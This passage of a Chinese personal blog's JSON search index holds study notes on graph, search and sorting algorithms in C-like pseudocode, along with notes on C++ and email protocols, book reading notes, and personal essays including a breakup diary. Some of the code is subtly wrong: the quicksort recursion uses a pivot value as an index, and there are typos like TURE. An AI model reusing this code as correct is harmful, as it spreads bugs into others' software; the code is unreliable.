w=NextAdjVex(G,u,w)) if (! visisted[w]) &#123;//w为u的尚未访问的邻接顶点 visisted[w] = TRUE; EnQueue(Q,w); &#125; &#125; &#125;&#125;//BFSTraverse 最小生成树问题 Prim算法 1234567891011121314151617void Prim(MGraph G, VertexType u)&#123;//用PRIM算法从第u个顶点出发构造网G的最小生成树T。 k=LocateVex(G,u); closedge[k].lowcost = 0; for (j=0; j&lt;G.vexnum; ++j) //辅助数组初始化 if (j!=k) // adjvex, lowcost closedge[j]=&#123;u, G.arcs[k][j].adj;&#125; for (i=1; i&lt;G.vexnum; ++i) &#123; k=minimum(closedge); //求出T的下一个节点 printf(closedge[k].adjvex, G.vexs[k]); //输出生成树的边 closedge[k].lowcost = 0; // 第k顶点并入U集 for (j=0; j&lt;G.vexnum; ++j) //更新节点间的距离 if (G.arc[k][j].adj&lt;closedge[j].lowcost) closedge[j]=&#123;G.vexs[k], G.arcs[k][j].adj&#125;; &#125;&#125; Kruskal算法(并查集思路) 12345678910111213141516171819202122232425262728293031323334struct Edge&#123; int a; int b; int weight; &#125;; //a-&gt;b=weightvoid Kruskal(MGraph G) //图以边集数组的形式存储&#123; int parent[MAXVEX]; for(i=0;i&lt;G-&gt;numVertexes;++i) //初始化， parent[i]=0; //元素值parent[i]非0时表示结点i与parent[i]之间的边已确定 i=min(G-&gt;edges).index //找到最短边 while(1) &#123; n=Find(parent,G-&gt;edges[i].a); m=Find(parent,G-&gt;edges[i].b); if(n!=m) //m,n原本没有连接(避免成环) &#123; parent[n]=m; //连接m,n printf(&quot;xxx&quot;); &#125; i=min(G-&gt;edges).index //找到最短边 if(IsCompleted(parent)) //判断最小生成树是否完成 return; &#125;&#125;int Find(int *parent,int f) //找到f的最前父节点&#123; while(parent[f]!=0) f=parent[f]; return f; &#125; 最短路径问题 Dijkstra算法 123456789101112131415161718192021222324252627282930void Dijkstra(MGraph G, int v0, PathMatrix *P, ShortPathTable *D)&#123; for (v=0; v&lt;G.vexnum; ++v) //初始化 &#123; final[v] = FALSE; //判断是否得到最短路径 D[v] = G.arcs[v0][v]; if (D[v]&lt;INFINITY) &#123; P[v0][v] = v;&#125; for (w=0; w&lt;G.vexnum; ++w) if(G.arcs[v][w]&lt;INFINITY) P[v][w] = w; &#125; D[v0]=0; final[v0]=TRUE for (i=1; i&lt;G.vexnum; ++i) &#123; min = INFINITY; for (w=0; w&lt;G.vexnum; ++w) //找到最近顶点 if (!final[w]) if (D[w]&lt;min) &#123; v=w; min = D[w] &#125; //w顶点离v0顶点更近 final[v] = TURE; //离v0顶点最近的v加入S集 for (w=0; w&lt;G.vexnum; ++w) //更新当前最短路径及距离 &#123; if (!final[w] &amp;&amp; (D[v]+G.arcs[v][w]&lt;D[w])) &#123; D[w] = D[v] + G.arcs[v][w]; P[v0][w] = v; &#125; &#125; &#125;&#125; Floyd算法(kij算法) 1234567891011121314151617181920void Floyd(MGraph G,PathMatrix *P, ShortPathTable *D)&#123; for(v=0;v&lt;G-&gt;numVertexes;++v) //初始化 &#123; for(w=0;w&lt;G-&gt;numVertexes;++w) &#123; D[v][w]=G-&gt;arc[v][w]; P[v][w]=w; &#125; &#125; for(k=0;k&lt;G-&gt;numVertexes;++k) for(v=0;v&lt;G-&gt;numVertexes;++v) for(w=0;w&lt;G-&gt;numVertexes;++w) if( D[v][w]&gt;D[v][k]+D[k][w] ) &#123; D[v][w] = D[v][k] + D[k][w]; P[v][w] = P[v][k]; &#125;&#125; 查找 二分查找(O(log(n))) 1234567891011int Search_Bin ( SSTable ST , KeyType key ) &#123; low = 1; high = ST.length; // 置区间初值 while (low &lt;= high) //二分查找 &#123; mid = (low + high) / 2; if （EQ (key , ST.elem[mid].key) ) return mid; // 找到待查元素 else if ( LT (key , ST.elem[mid].key) ) high = mid - 1; // 继续在前半区间进行查找 else low = mid + 1; // 继续在后半区间进行查找 &#125; return 0; 二叉查找树 12345678BiTree SearchBST (BiTree T, KeyType key, ) &#123; // 在根指针 T 所指二叉排序树中递归地查找其关键字等于 key的数据元素，若查找成功，则//返回指向该数据元素 的指针否则表明查找不成功，返回空指针NULL if( (!T)||EQ(key,T-&gt;data.key) ) return(T); else if ( LT(key,T-&gt;data.key) ) return(SearchBST(T-&gt;lchild,key)); else return (SearchBST(T-&gt;rchild,key));&#125; // SearchBST 二叉平衡树(log(n)) Hash表冲突处理方法 开放定址法 线性探测法 Hi=(Hash(key)+di) mod m(di为i) 二次探测法 Hi=(Hash(key)±di) mod m(di为i的平方) 若di＝伪随机序列，就称为伪随机探测法 链地址法 再哈希法 Hi=RHi(key) 建立一个公共溢出区 排序 稳定排序与不稳定排序 内部排序与外部排序 插入排序 直接插入排序(时间复杂度O(n2)，空间复杂度O(1)，稳定排序) 折半插入排序,2-路插入排序,表插入排序 希尔排序(时间复杂度(O(n1.25）～O（1.6n1.25）),空间复杂度O(1)，不稳定排序) 交换排序 冒泡排序((时间复杂度O(n2)，空间复杂度O(1)，稳定排序)) 优化方式： 双向冒泡排序 设置一个标记变量flag，当循环中没有交换数据时，停止循环。 快速排序123456789101112131415161718192021222324252627void quick_sort(int s[],int l,int r)&#123; if(l &lt; r) &#123; int i=l,j=r,m=s[l]; while(i&lt;j) &#123; while(i&lt;j &amp;&amp; s[j]&gt;=m) //从右到左找到第一个小于m的数 j--; while(i&lt;j &amp;&amp; s[i]&lt;=m) //从左往右找到第一个大于m的数 i++; if(i&lt;j) &#123; int temp1 = s[j]; s[j] = s[i]; s[i] = temp1; &#125; &#125; int temp2 = s[j]; s[j] = s[i]; s[i] = temp2; quick_sort(s,i,m-1); //递归调用 quick_sort(s,i+1,r); &#125;&#125; 选择排序 简单选择排序 锦标赛排序(时间复杂度O(nlog2n)，空间复杂度O(n),稳定排序) 堆排序(时间复杂度O(nlog2n)，空间复杂度O(1),不稳定排序) 12345678void HeapSort (HeapType &amp;H ) &#123; for ( i = H.length / 2; i &gt;0; - - i ) HeapAdjust(H,i, H.length ); //for,建立初始堆 for ( i = H.length; i &gt; 1; - -i) &#123; H.r[1] ←→ H.r[i]; //交换，要借用temp HeapAdjust( H, 1,i-1 ); //重建最大堆, i-1=m &#125; &#125; 12345678910111213HeapAdjust(HeapType *H,current,m)&#123; child = 2 * current; while(child&lt;=m)&#123; //选取child中的较大值 child = (H[child].key&gt;H[child+1].key) ? child : child+1 ; if(H[current].key&lt;H[child].key)&#123; //将较大值上移 H[current] ←→ H[child]; current = child; child *= 2; &#125; else break； &#125;&#125; 归并排序(时间复杂度O(nlog2n)，空间复杂度O(n),稳定排序) 12345678910void MSort (SR[ ],&amp;TR1[ ]，s, t) &#123; // 将无序的SR[s…t]归并排序为TR1[s…t] if ( s==t ) TR1[s]=SR[s]; else&#123; m=(s+t)/2; MSort (SR，&amp;TR2，s, m); MSort (SR，&amp;TR2，m+1, t ); Merge(TR2， TR1， s, m, t ); &#125; &#125; 123456789void Merge (SR，&amp;TR，i, m, n) &#123; // 将有序的SR[i…m]和SR[m+1…n]归并为有序的TR[i…n] for(k=i , j=m+1; i&lt;=m &amp;&amp; j&lt;=n; ++k ) &#123; if ( SR[i]&lt;= SR[j] ) TR[k]=SR[i++]; else TR[k]=SR[j++]; // 将两个SR记录由小到大并入TR &#125; // for if (i&lt;=m) TR[k…n]=SR[i…m]; // 将剩余的SR[i…m]复制到TR if (j&lt;=n) TR[k…n]=SR[j…n]; // 将剩余的SR[j…n]复制到TR&#125; // Merge 基数排序(时间复杂度O(d(n+radix))，空间复杂度(O(n+radix)),稳定排序) MSD 最高位优先法 LSD 最低位优先法 八大排序的比较 八大排序的比较 参考资料八大排序源码与分析","categories":[{"name":"算法","slug":"算法","permalink":"https://liuyi12138.github.io/categories/算法/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"https://liuyi12138.github.io/tags/数据结构/"}]},{"title":"C++面向对象学习笔记","slug":"C++面向对象学习笔记","date":"2018-05-14T12:34:04.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2018/05/14/C++面向对象学习笔记/","link":"","permalink":"https://liuyi12138.github.io/2018/05/14/C++面向对象学习笔记/","excerpt":"C++和C的比较学习","text":"C++和C的比较学习 枚举(关键字 enum) 默认情况下，第一个名称值为0，后面依次+1，给特定名称赋值后，前面的名称值不变，后面的依次变化12enum color &#123; red, green=5, blue &#125;c;c = blue; C++类 类成员的访问类型： public:公有类型成员 private:私有类型成员 protected:保护类型成员1234567class Box&#123; public: double length; // 盒子的长度 double breadth; // 盒子的宽度 double height; // 盒子的高度&#125;; C++继承 派生类 命名形式class derived-class: access-specifier base-class derived-class:派生类名，access-specifier：类成员的访问类型，base-class：基类 基类中访问类型为private的成员不可被派生类访问(protected可以) 继承类型 公有继承（public）：当一个类派生自公有基类时，基类的公有成员也是派生类的公有成员，基类的保护成员也是派生类的保护成员，基类的私有成员不能直接被派生类访问，但是可以通过调用基类的公有和保护成员来访问 保护继承（protected）： 当一个类派生自保护基类时，基类的公有和保护成员将成为派生类的保护成员 私有继承（private）：当一个类派生自私有基类时，基类的公有和保护成员将成为派生类的私有成员 多继承 命名形式class &lt;派生类名&gt;:&lt;继承方式1&gt;&lt;基类名1&gt;,&lt;继承方式2&gt;&lt;基类名2&gt;,… C++多态 如果父类与子类中含有相同的函数名，子类继承时该函数被父类的函数覆盖 在父类的函数声明前放置关键字 virtual则优先执行子类中的函数 在基类中使用关键字 virtual 声明的函数称为虚函数，在派生类中重新定义基类中定义的虚函数时，会告诉编译器不要静态链接到该函数","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://liuyi12138.github.io/categories/编程语言/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://liuyi12138.github.io/tags/C/"}]},{"title":"电子邮件协议学习笔记","slug":"电子邮件协议学习笔记","date":"2018-05-12T02:03:47.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2018/05/12/电子邮件协议学习笔记/","link":"","permalink":"https://liuyi12138.github.io/2018/05/12/电子邮件协议学习笔记/","excerpt":"网络协议","text":"网络协议 OSI/RM 一种分层的体系结构，参考模型有7层： 媒介层：物理层，数据链路层，网络层 主机层：传输层，会话层，表示层，应用层 TCP/IP是基于OSI/RM的协议簇，包含多种协议 应用层发送请求，每一层封装自己的信息到请求中，最后将整个请求发送。 接受请求从最底层（网络接口层）开始，每一层解析属于自己的信息。 TCP协议 TCP协议是以太网协议和IP协议的上层协议，也是应用层协议的下层协议。 以太网协议规定了电子信号如何组成数据包，解决了子网的点对点通信，IP协议解决了多个局域网互通的问题。 TCP协议保证数据通信的完整性和可靠性，防止丢包。 数据包 TCP协议中的三次握手和四次挥手建立连接的三次握手 第一次握手：客户端向服务端发送连接请求包，标记位SYN置为1，Seq=X=0 第二次握手：服务器由SYN=1得知客户端请求建立连接，为这次连接分配资源，向客户端返回应该SYN和ACK都置为1的TCP报文，设置顺序号码(Seq)=Y=0，确认号码(ack)=X+1=1 第三次握手：客户端检查ack是否正确以及ACK是否为1,若正确，客户端再次发包，ACK为1，SYN为0，ack=Y+1=1，Seq=X+1=1，Server收到后确认号码值与ACK=1则连接建立成功，可以传送数据了 SYN表示连接,ACK表示响应，X为客户端发给服务端的顺序号码，Y为服务器发给客户端的顺序号码，服务端和客户端分别验证XY来检查是否是与同一个端口握手 断开连接的四次挥手客户端和服务端都可以断开连接 第一次挥手：客户端向服务端发送FIN报文，将标志位FIN和ACK置为1，顺序号码为X=1，确认号码Z=1 第二次挥手：服务端收到FIN后，发回ACK=1，ack=X+1=2，Seq=Z。客户端进入FIN_WAIT状态。 第三次挥手: 服务端数据发送完毕，向客户端发送FIN报文，关闭连接,其他值与第二次挥手相同 第四次挥手：客户端收到FIN，发回ack=Z+1=2,ACK=1顺序号码Seq=X+1=2，客户端进入TIME_WAIT状态，如果服务端没有回应说明服务端已经关闭则客户端关闭。 FIN表示关闭连接每一次发包的ack(确认号码)与上一次接包的Seq(顺序号码)相同,ack与Seq交替保证端头的唯一性 图解TCP 电子邮件协议 常用的电子邮件协议有SMTP、POP3、IMAP4，它们都隶属于TCP/IP协议簇，处于应用层的下层。 SMIP SMIP协议帮助每台计算机在发送或中转信件时找到下一个目的地 SMTP认证：要求必须在提供了账户名和密码之后才可以登录 SMTP 服务器 POP POP邮局协议负责从邮件服务器中检索电子邮件 POP可以下载邮件、从服务器中删除邮件或询问是否有新邮件 IMAP 互联网信息访问协议（IMAP）是一种优于POP的新协议,它可以决定客户机请求邮件服务器提交所收到邮件的方式，请求邮件服务器只下载所选中的邮件而不是全部邮件 SMIP SMIP是一种推协议，即服务端向客户端发送推送请求，客户端接受，服务端发送邮件 SMIP用于将发送方的邮件服务器发送报文到接收方邮件服务器 当需要将邮件从接收方服务器发送到用户手中时，不能用SMIP协议，因为当用户不接受邮件时服务器会一直请求，这样会造成资源浪费，此时需要拉协议(最典型的拉协议是HTTP协议)如POP或IMAP POP3POP3按照3个阶段进行工作：特许、事务处理以及更新 特许阶段，用户代理发送用户名和口令 事务处理阶段：用户代理取回报文；还可以对报文做删除标记，取消报文删除标记，以及获取邮件的统计信息 更新阶段：结束该POP3会话；这个时候该邮件服务器删除那些被标记的删除的报文 POP3的缺陷：当用户用用户代理将邮件存储在本地之后，在本地所进行的对邮件的删除等操作，不会对用户的邮件服务器造成影响 IMAP IMAP是双向的，在本地的操作也会反馈到服务器 参考连接 五分钟读懂TCP 协议——TCP协议简介 网络协议之Tcp、Http 电子邮件协议百度百科 邮件系统协议及其工作原理 电子邮件协议之SMTP、POP3和IMAP","categories":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://liuyi12138.github.io/categories/计算机网络/"}],"tags":[{"name":"电子邮件","slug":"电子邮件","permalink":"https://liuyi12138.github.io/tags/电子邮件/"}]},{"title":"吴军的谷歌方法论学习笔记5","slug":"吴军的谷歌方法论学习笔记5","date":"2018-04-18T15:25:50.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2018/04/18/吴军的谷歌方法论学习笔记5/","link":"","permalink":"https://liuyi12138.github.io/2018/04/18/吴军的谷歌方法论学习笔记5/","excerpt":"答读者问1 什么是计算机思维","text":"答读者问1 什么是计算机思维 计算机思维的真谛是什么需要处理好七对关系 大和小 快和慢 多维度和单一维度 网络和个体 自顶向下和自底向下 全部和局部 成本和表现 理解两个原则 等价性原则 模块化原则 行业升级转变的经验 目标要超前，方法和认识要彻底更新 做法上要渐进，反对一切推到重来 坚持“原有产业+新技术=新产业”的原则 放弃不适合改变的人 把事情做好的三条边基线 基线是每个人掌握的知识 每个人的基线都不一样，应该站在尽可能高的起点理论极限 理论极限无法突破循序渐进的绳索 把目标拆分为具体的行动步骤，并专注与其中，不要做其他无谓的事","categories":[{"name":"吴军的谷歌方法论","slug":"吴军的谷歌方法论","permalink":"https://liuyi12138.github.io/categories/吴军的谷歌方法论/"}],"tags":[{"name":"吴军的谷歌方法论","slug":"吴军的谷歌方法论","permalink":"https://liuyi12138.github.io/tags/吴军的谷歌方法论/"}]},{"title":"吴军的谷歌方法论学习笔记4","slug":"吴军的谷歌方法论学习笔记4","date":"2018-04-16T15:14:07.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2018/04/16/吴军的谷歌方法论学习笔记4/","link":"","permalink":"https://liuyi12138.github.io/2018/04/16/吴军的谷歌方法论学习笔记4/","excerpt":"在边界里面做事情","text":"在边界里面做事情 1.理论极限无法突破，不要做徒劳的事 设立标准的本质是要求人们在边界里尽可能地做好事情 2.写清楚的边界不让外行人过去 作为行业外的人要虚心求教，不要强行突破极限 手机相机不可能达到千万级像素（被某品牌骗了） 3.思考题 举例生活中的边界问题 我的思考 ：光速？？？ 苹果成功的奥秘：从科学与技术的区别说起1.赢者通吃 在科学层面，非量级上的数字变化对我们是无意义的，但在技术层面，一点点微小的优势就能赢得整个比赛 若要投资则一定要投行业内的第一名，若要兼并以获得技术，则应该考虑第二第三甚至第四名 我的感受：想起了杨洋学长的讲座，没有把握做到第一就不去碰这个行业2.苹果公司的成功之路 1）不做基础研究，更多地去发掘技术 我的思考：苹果公司的成功之道与技术创业究竟谁对谁错，或者两者各有千秋？技术创业究竟有未来吗，面对苹果公司这样的巨头，拼的到底是技术还是聚集资源的能力？技术创业公司是否都会走上被兼并的命运，又想起来了罗胖所说的巨头的倒塌，小公司的资源聚集能力会增强的论调，不知道到底哪种方式更加高效 2）更加注重整体，平衡各种需求 3.思考题 如何看待苹果整体优化产品而不是只关注某个指标的思维方式 我的思考：感觉苹果公司更加注重用户体验，更加符合现代的体验经济","categories":[{"name":"吴军的谷歌方法论","slug":"吴军的谷歌方法论","permalink":"https://liuyi12138.github.io/categories/吴军的谷歌方法论/"}],"tags":[{"name":"吴军的谷歌方法论","slug":"吴军的谷歌方法论","permalink":"https://liuyi12138.github.io/tags/吴军的谷歌方法论/"}]},{"title":"吴军的谷歌方法论学习笔记3","slug":"吴军的谷歌方法论学习笔记3","date":"2018-04-12T15:24:47.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2018/04/12/吴军的谷歌方法论学习笔记3/","link":"","permalink":"https://liuyi12138.github.io/2018/04/12/吴军的谷歌方法论学习笔记3/","excerpt":"成就=成功率×事情的量级×做事的速度","text":"成就=成功率×事情的量级×做事的速度 1.数量级与量级 理解量级上的巨大差距 理清事物间的量级差别 我的经历：在写贝叶斯算法的时候，我解决的都是处理数据上的问题，但没有处理算法，就是没有理清量级问题，导致时间复杂度很高而准确率一直上不去。 2.职场上的量级问题 程序员技术转管理的职场身份转变中，思想问题的量级需要转变 俞敏洪从金牌讲师到校长的转变——从做好自己的业务到如何帮着他人提高水平 我的经历：在开发学生招新网站的时候，我作为管理者，却常常关心的是如何去实现功能，到最后组员的参与度都不够，只有几个核心人员在开发。 3.思考题 能否举几个生活中有量级之差的例子 我的思考：刷题与理解概念对学习上帮助","categories":[{"name":"吴军的谷歌方法论","slug":"吴军的谷歌方法论","permalink":"https://liuyi12138.github.io/categories/吴军的谷歌方法论/"}],"tags":[{"name":"吴军的谷歌方法论","slug":"吴军的谷歌方法论","permalink":"https://liuyi12138.github.io/tags/吴军的谷歌方法论/"}]},{"title":"吴军的谷歌方法论学习笔记2","slug":"吴军的谷歌方法论学习笔记2","date":"2018-04-10T15:10:32.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2018/04/10/吴军的谷歌方法论学习笔记2/","link":"","permalink":"https://liuyi12138.github.io/2018/04/10/吴军的谷歌方法论学习笔记2/","excerpt":"工程思维：直觉与极限","text":"工程思维：直觉与极限 1.人们常被直觉欺骗 Google对产品经理的要求：在没有数据之前不要轻易给出结论 我的体会：人类对数据无感但是是不是只有数据才能正真反映问题的实质 2.通过工程思维探讨极限问题 从燃机效率的例子里面看极限 看待问题常常需要跳出问题本身，观察蚂蚁的爬行轨迹需要从上方去看 3.思考题 为什么应该国家的经济增长速度很难维持在7%以上 我的思考 若是如此，在10年里，经济总量将会翻一倍，在30年里，经济总量将翻7.6倍，这是很难实现的。 为什么计算机不是万能的1.常人思维与图灵思维 常人的思维是工匠式的，是迭代的，是先实现一个个小功能再不断叠加 图灵的思维是从问题的源头出发 图灵三连: 是不是世界上所有的问题都有解 是不是所有的解都能在有限步解出 是否有一种机器使得机器停止时正好求出解 人工智能的极限 世界上所有问题中只有一部分是数学问题 数学问题中只有一部分是有解的 有解的问题中只有一部分是计算机能解决的 能解决的问题中只有一部分是人工智能能解决的 人工智能能解决的问题中只有一部分是现在的人工智能能解决的 so，人工智能并不是万能的 ###3. 图灵思想的来源 希尔伯特的启发：希尔伯特问题：随便给一个方程，能否通过有限步运算判定是否存在整数解 冯诺依曼的启示：计算来自于确定性的机械运动，而意识来自于不确定性 ###4.我的启示 作为一个程序员，在写代码的过程中首先得有大局观念，要像图灵那样高屋建瓴，否则永远跳不出图灵机的范畴，拿写前端为例，初学者一般都是HTML的堆砌，而在工程学上首先需要搭建框架，并为可能的模块预留空间。 要跟优秀的人在一起哦!","categories":[{"name":"吴军的谷歌方法论","slug":"吴军的谷歌方法论","permalink":"https://liuyi12138.github.io/categories/吴军的谷歌方法论/"}],"tags":[{"name":"吴军的谷歌方法论","slug":"吴军的谷歌方法论","permalink":"https://liuyi12138.github.io/tags/吴军的谷歌方法论/"}]},{"title":"吴军的谷歌方法论学习笔记1","slug":"吴军的谷歌方法论学习笔记1","date":"2018-04-09T14:15:30.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2018/04/09/吴军的谷歌方法论学习笔记1/","link":"","permalink":"https://liuyi12138.github.io/2018/04/09/吴军的谷歌方法论学习笔记1/","excerpt":"职业天花板来自认知的局限性——新时代需要计算机思维","text":"职业天花板来自认知的局限性——新时代需要计算机思维 1.对量级的认识 人对大数字无感 人对大小的理解受限于生活环境 2.人与计算机思维的区别 对可计算问题和不可计算问题的鉴别(例如：围棋问题) 人的思维变化速度远慢于计算机的发展速度 3.如何学习计算机思维 从十倍或百倍数据量的角度来思考问题,判断自己想做成的事的未来的那个时间节点上，技术的进化程度 4.思考题 未来十年，世界上什么东西增长最快，或者世界上什么地方变化最快 我的思考 未来十年，应该是数据增长得最快，世界上像硅谷这样的计算机行业驻扎的地区变化最快评论中的思考 1.AI相关的技术增长最快，AI技术和资源最丰富的地方(美国和中国)变化最快 2.人机联合的有机体增长最快 3.人类的思想认知增长最快 思维方式决定商业模式1.对数量大小的认知不同 1.生活在不同世界的人，思维方式及行为不同 2.从小数问题上总结出来的规律无法应用于大数问题 2.在计算机世界应该擅长使用专业人士给出的优秀解决方案 传统门户网站和今日头条 普通银行和蚂蚁金服 (我倒认为机遇也是成功的一部分) 3.思考题 如何做好一个好的报告 我的思考 由于人对数字是无感的，所以报告应该多以图表等方式来展示数据 评论中的思考 善用图表，让听众视觉上有明显感觉 善用类比，来连接数字与听众熟悉的认知 善用比例，来突显数字之间的关系 换算数字，形象化，整体缩放","categories":[{"name":"吴军的谷歌方法论","slug":"吴军的谷歌方法论","permalink":"https://liuyi12138.github.io/categories/吴军的谷歌方法论/"}],"tags":[{"name":"吴军的谷歌方法论","slug":"吴军的谷歌方法论","permalink":"https://liuyi12138.github.io/tags/吴军的谷歌方法论/"}]},{"title":"西瓜书第二章学习笔记","slug":"西瓜书第二章学习笔记","date":"2018-04-09T06:30:43.000Z","updated":"2021-02-23T06:34:31.941Z","comments":true,"path":"2018/04/09/西瓜书第二章学习笔记/","link":"","permalink":"https://liuyi12138.github.io/2018/04/09/西瓜书第二章学习笔记/","excerpt":"我的手写体学习笔记","text":"我的手写体学习笔记 2.1 2.2 2.3 2.4 2.5 2.6 2.7 2.8 2.9 2.10","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://liuyi12138.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://liuyi12138.github.io/tags/机器学习/"}]},{"title":"念一个云白花清的人","slug":"念一个云白花清的人","date":"2018-04-09T06:27:11.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2018/04/09/念一个云白花清的人/","link":"","permalink":"https://liuyi12138.github.io/2018/04/09/念一个云白花清的人/","excerpt":"前言：这是许久前写的旧文了，今日拿出来给一友人看，被评价文字清新．大概是以前怀有美好的向往，而现在，也许太累了，不过我依旧向往着有朝一日，能遇上那云白花清的人．","text":"前言：这是许久前写的旧文了，今日拿出来给一友人看，被评价文字清新．大概是以前怀有美好的向往，而现在，也许太累了，不过我依旧向往着有朝一日，能遇上那云白花清的人． 午夜，在穿林打叶声，梧桐三更雨里惊醒，好一会儿才定下心来，突然想听雨声。打开百叶窗 ，檐下雨角嘀嗒，陶醉在雨打芭蕉的乐章中。再看窗外，又是一震，在雨中，有一人的身影，一袭长衫，舞袖翩跹，涉一袭水墨而来。 那身影就这样舞了出来，和着蛙叫虫鸣，压着大自然的节拍。一脚一脚，踩着雨打出来的韵脚，一招一招，舞出山水曼妙。不禁想起曹植《洛神赋》中宓妃“飘若惊鸿，婉若游龙”的身段，一下笑出声来，原来世间有如此佳人，也怪不得子建为之“怅盘桓而不能去”了。看着看着，整个人都痴了过去，竟冒出一句只有宝玉才说得出的痴话：这位妹妹，好像在哪里见过。 仔细一想，岂止是见过，更是念过。高考前夕，驱车往问津书院祈福，车在山间回转，满脑子都是“绿树村边合，青山郭外斜。”倏然，一山之后，一座庙宇映入眼帘，是问津书院了。入大门，见过孔子像，直往里走，是七十二贤人，便一一拜了过去。颜回、子路、冉求……到了朱熹脚下，抬头直视，有一人的笑靥。虽说已心随三毛多年，没少见奇闻异事种种，但还是吃了一惊。再回神，却只能见青铜像了，不禁有些失望。心想，这定是我念了多年的姑娘。 从小到大，每每回老家祭祖，都是要在祖坟前叩头许愿的。母亲总是念叨着家人平安，儿有所成，但对于年少的我，心中常念的，是能遇到个云白花清的姑娘。倒也是老天爷遂了人愿，那姑娘似乎未曾远去，在人心间萦绕。孩童时，她着一身碎花裙，一蹦一跳，惹人爱怜；少年时，她常穿的是素色衬衣，清纯可人；后来，她最喜欢的莫过于连衣裙，茉莉花的颜色，带着芬芳，裙摆上绣着山水诗行。 现如今，我也别离了生命中一段忙碌的岁月，过着闲适生活的同时，我有更多的时间去念那个水样的姑娘。不知她如今又身在何方。若是知晓她的住址，我一定会在花瓣上刻一封情书寄去，那一帛花信会是这样写的： 我愿倾尽一生的时光，画一叶荷，开一朵莲，留在世间迎你。若是花谢了，你还未来，也要落得一塘枯荷，听风声，听雨声，听你的盈盈脚步声。","categories":[{"name":"文学","slug":"文学","permalink":"https://liuyi12138.github.io/categories/文学/"}],"tags":[{"name":"心声","slug":"心声","permalink":"https://liuyi12138.github.io/tags/心声/"}]},{"title":"前端学习笔记","slug":"前端学习笔记","date":"2018-04-09T06:26:34.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2018/04/09/前端学习笔记/","link":"","permalink":"https://liuyi12138.github.io/2018/04/09/前端学习笔记/","excerpt":"W3school 前端学习笔记","text":"W3school 前端学习笔记 HTML基础 &lt;br /&gt;是关闭空元素的正确方法(换行) &lt;hr /&gt;标签在 HTML 页面中创建水平线 浏览器会自动地在块级元素(段落，标题等)的前后添加空行 注释：&lt;!-- This is a comment --&gt; HTML 代码中的所有连续的空行（换行）被显示为一个空格 &lt;pre&gt;标签保留空格 XML基础XML 是独立于软件和硬件的信息传输工具。 XML和HTML的区别 XML HTML 目的 传输和储存信息 显示信息 焦点 数据的内容 数据的外观 &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;XML声明不需要关闭标签 XML标签大小写敏感，而HTML不区分大小写 XPath基础 XPath 中，有七种类型的节点：元素、属性、文本、命名空间、处理指令、注释以及文档（根）节点 /bookstore/book[1]选取属于 bookstore 子元素的第一个 book 元素,不是第二个 步:轴名称::节点测试[谓语] price=9.80这是判断不是赋值 XQuery基础 FLWOR 是 “For, Let, Where, Order by, Return” 的只取首字母缩写。 order by 语句定义了排序次序 XQuery 变量由 “$” 并跟随一个名称来进行定义，举例，$bookstore XQuery 注释被 (: 和 :) 分割，例如，(: XQuery 注释 :)","categories":[{"name":"前端","slug":"前端","permalink":"https://liuyi12138.github.io/categories/前端/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://liuyi12138.github.io/tags/Web/"}]},{"title":"许你的一百零九个日夜","slug":"许你的一百零九个日夜","date":"2018-04-09T06:25:44.000Z","updated":"2021-02-23T06:34:31.941Z","comments":true,"path":"2018/04/09/许你的一百零九个日夜/","link":"","permalink":"https://liuyi12138.github.io/2018/04/09/许你的一百零九个日夜/","excerpt":"今天很冷，天气预报说要下雪了，不知道你有没有好好穿衣服。一个人回到寝室，室友都出去自习了，寝室很空，心里也很空，一个人的时候，常常会想起你。","text":"今天很冷，天气预报说要下雪了，不知道你有没有好好穿衣服。一个人回到寝室，室友都出去自习了，寝室很空，心里也很空，一个人的时候，常常会想起你。 认识你也挺久了，大概四个月吧，具体的，真的记不清了，只记得你陪了我一百零九个日夜，从2017年10月2日凌晨，到2018年1月18日下午４点，缘分终于走到了尽头。 一百零九天，说长也不长，说短也不短，恰好够两个人相识，相知，相爱，相别。 我还记得，2017年10月1日的夜晚，要放假了，可以回家了，大家都很开心，或许只是一句打趣，或许是我动心了，我向你伸出了手，你应允了。接下来是一周的假期，我们都回家了，没有故事中那样的热切与盼望，开始得平静如水，却又波澜四起。 2017年9月15日，第一次送你生日礼物，你又气又笑，可惜没有第二次了。 2017年10月7日，我们看了《缝纫机乐队》，第一次牵起你的手，一起走回学校。 2017年12月25日，和你的第一个圣诞节，我的礼物迟到了很久，你很生气。知道你在给我织围巾，很暖，只是没能带上。 2017年12月29日，我的18岁生日，第一次在vip厅看电影，座椅很大很舒服，可是不能牵你的手。你说礼物以后会给我，我没能等到。 2018年1月11日，你对上机考试很生气，也很迷茫，我们开始吵架，其实是我没有义无反顾地支持你，只是一直说对不起。 2018年1月16日，我送你回家，晚上你开始数落我的不是，我也对你提了意见，很开心，两个人都在为对方改变。 2018年1月17日，谈到了城乡差异与性格不合，你在规划未来，你让我说，我没有考虑到你。 2018年1月18日，你问我的选择，我不知道你的绝情是装出来的，或许我知道你在等我拉你回去，对不起，我太累了。 我为什么会选择离开，就像我闺蜜所说的，两个人这样谈恋爱，太累。或许是我不太懂你，或许你也不曾懂我。每次吵都是你在为未来担忧，不曾想想现在如何。我知道你想要未来，你想要两个人一直在一起，可不知你有没有想过我想要什么，我真的是个简单的人，我只想像普通情侣一样，在一天的辛苦学习之后，能有一小段轻松快乐，无忧无虑的时光，但跟你在一起，却总是提心吊胆。或许这就是命，我们俩注定不一样，一个活在理想中，一个活在世俗中。 